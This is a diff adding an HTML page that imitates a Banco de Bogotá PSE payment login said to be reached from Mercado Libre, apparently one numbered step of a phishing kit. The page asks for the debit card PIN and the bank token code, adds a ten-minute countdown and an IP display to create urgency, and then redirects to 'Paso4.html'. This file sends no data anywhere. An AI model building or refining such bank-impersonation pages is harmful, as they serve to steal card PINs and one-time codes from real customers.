@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identificación de usuario - Pagos PSE</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f7f8fa;
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+
+        .container {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0px 4px 6px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .container img {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+
+        .container h2 {
+            font-size: 18px;
+            color: #2d2d2d;
+            margin-bottom: 20px;
+        }
+
+        .info {
+            background: #f1f1f1;
+            border-radius: 5px;
+            padding: 15px;
+            font-size: 14px;
+            color: #555;
+            margin-bottom: 20px;
+        }
+
+        .info strong {
+            color: #000;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            color: #666;
+            text-align: left;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+            font-size: 14px;
+            margin-top: 5px;
+        }
+
+        .button {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background: #ccc;
+            color: #fff;
+            font-size: 14px;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .button.active {
+            background: #0071ce;
+        }
+
+        .footer {
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+        }
+
+        .footer strong {
+            color: #000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="imagenes\banco.jpg" alt="Banco de Bogotá">
+        <h2>Identificación de usuario<br>Pagos PSE</h2>
+
+        <div class="info">
+            Ha ingresado desde: <strong>Mercado Libre</strong>
+        </div>
+
+        <form>
+            <div class="form-group">
+                <label for="clave">Clave de la tarjeta débito</label>
+                <input type="password" id="clave" placeholder="Ingresa clave" required>
+            </div>
+            <div class="form-group">
+                <label for="token">Código Token</label>
+                <input type="text" id="token" placeholder="Ingresa código" required>
+            </div>
+            <button type="button" class="button active" onclick="continuar()">Continuar</button>
+        </form>
+
+        <div class="footer">
+            Tiempo restante: <strong>10 minutos</strong><br>
+            IP: <strong>161.10.187.253</strong>
+        </div>
+    </div>
+
+    <script>
+        function continuar() {
+            alert("Redirigiendo...");
+            // Aquí puedes agregar redirección o validación
+            window.location.href = "Paso4.html";
+        }
+    </script>
+</body>
+</html>
